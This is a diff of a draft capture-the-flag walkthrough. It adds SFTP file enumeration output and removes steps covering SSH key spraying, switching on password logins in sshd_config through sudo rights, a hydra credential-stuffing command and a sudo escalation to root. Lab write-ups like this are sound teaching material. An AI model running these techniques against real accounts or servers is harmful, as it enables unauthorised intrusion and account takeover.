@@ -255,6 +255,42 @@ sftp>
 ```
 
 ### sftp, Lateral Move to net-admin
+#### Enumerating SFTP Documents
+Step 1: 'get' copies of all the documents and sift through the information.
+
+```bash
+cd uploads
+get -r *
+```
+
+```bash
+Fetching /uploads/conf.bak/ to conf.bak
+Retrieving /uploads/conf.bak
+sw1.config                                                                                                                            100% 1323     1.1MB/s   00:00    
+sw2.config                                                                                                                            100% 1466     1.3MB/s   00:00    
+r1.conf                                                                                                                               100% 1184     1.2MB/s   00:00    
+Fetching /uploads/internship.bak/ to internship.bak
+Retrieving /uploads/internship.bak
+welcome.txt                                                                                                                           100% 2796     3.1MB/s   00:00    
+internshipChecklist.txt                                                                                                               100% 2034     1.0MB/s   00:00    
+Fetching /uploads/scripts/ to scripts
+Retrieving /uploads/scripts
+sw1BackUpConfig.py                                                                                                                    100%  939   137.6KB/s   00:00    
+r1BackUpConfig.py                                                                                                                     100% 1617     1.4MB/s   00:00    
+sw2Status.py                                                                                                                          100%  939   154.8KB/s   00:00    
+Fetching /uploads/supportTickets.bak/ to supportTickets.bak
+Retrieving /uploads/supportTickets.bak
+[!]Ticket#NX-001                                                                                                                      100%  261   705.0KB/s   00:00    
+Ticket#NX-007                                                                                                                         100%  135    65.8KB/s   00:00    
+Ticket#NX-002                                                                                                                         100%  180   164.7KB/s   00:00    
+Ticket#NX-004                                                                                                                         100%  113   124.6KB/s   00:00    
+Ticket#NX-006                                                                                                                         100%  145   127.6KB/s   00:00    
+Ticket#NX-003                                                                                                                         100%  124    74.1KB/s   00:00    
+Ticket#NX-005                                                                                                                         100%  136    39.3KB/s   00:00    
+Ticket#NX-001                                                                                                                         100%  290   270.2KB/s   00:00
+```
+
+
 
  
 
@@ -271,67 +307,3 @@ sftp>
 With valid credentials we can enumerate the sftp service and sift through the documents for pertinent 
 information. There are two particular documents that indicate a likely attack vector. blah blah blah
 
-```bash
-cd /uploads/.tempKeys
-get *
-```
-
-Given the information from the support tickets, b_harris is a good starting point to conduct a 
-key spray attack with. First, set the permissions of b_harris id_rsa:
-
-```bash
-chmod 600 id_rsa_harris
-```
-
-```bash
-sudo nmap long command
-```
-
-The key-spray provides access to an additional account, the net-admin.
-
-### net-admin to sys-admin
-
-Now that we have compromised the net-admin account, we can begin the recon and enumeration of the
-newly acquired account. A common check is to see what sudo privs a user has:
-
-```bash
-sudo -l
-```
-
-The net-admin has the ability to start, stop, restart, check status, and edit the sshd_config file. 
-Given our permissions, lets see what the current configuration of the ssh server is:
-
-```bash
-sudo /usr/bin/vim /etc/ssh/sshd_config
-```
-
-The match blocks at the bottom do not allow password logins, only id_rsa. With the keys we have already,
-we have reached a dead end. However, we still have breached credentials we can test agains the net-admin, and
-sys-admin accounts. Lets see change the server settings so we can execute more credential stuffing attacks:
-
-```bash
-passwordAuthentication yes
-```
-
-Using the breached password list, conduct a credential stuffing attack against the net-admin and sys-admin
-accounts.
-
-```bash
-hydar -L admins.txt -P breachedPWD.txt $ip ssh
-```
-
-Now we have more credentials, and they belong to the sys-admin account. Log into the account and check your id
-and privileges.
-
-```bash
-id
-sudo -l
-```
-
-Paydirt! Sys-admin has no password for sudo, which means we have completely compromised the account. Switch the
-user to root and collect your flag.
-
-```bash
-sudo su
-id
-```
